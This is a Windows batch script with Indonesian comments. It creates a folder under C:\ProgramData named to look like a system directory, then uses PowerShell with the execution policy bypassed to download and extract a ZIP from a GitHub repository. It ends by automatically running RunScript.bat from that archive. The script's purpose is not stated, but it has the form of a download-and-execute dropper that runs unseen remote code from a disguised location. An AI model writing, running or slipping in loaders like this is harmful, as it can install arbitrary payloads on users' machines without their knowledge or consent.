@echo off
:: Nonaktifkan echo untuk tampilan bersih

:: Buat folder tujuan
mkdir "C:\ProgramData\AppData" 2>nul

:: Pindah ke folder tujuan
cd /d "C:\ProgramData\AppData"

:: Unduh ZIP dari GitHub tanpa jeda manual
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile 'XMASTERTES.zip'"

:: Ekstrak ZIP (PowerShell 5+)
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Expand-Archive -Path 'XMASTERTES.zip' -DestinationPath 'C:\ProgramData\AppData' -Force"

:: Buka folder hasil ekstrak di File Explorer
start "" explorer "C:\ProgramData\AppData\XMASTERTES-main"

:: Jalankan RunScript.bat jika tersedia (tanpa membuka cmd window)
if exist "C:\ProgramData\AppData\XMASTERTES-main\RunScript.bat" (
    start "" "C:\ProgramData\AppData\XMASTERTES-main\RunScript.bat"
)

:: Tutup CMD otomatis
exit
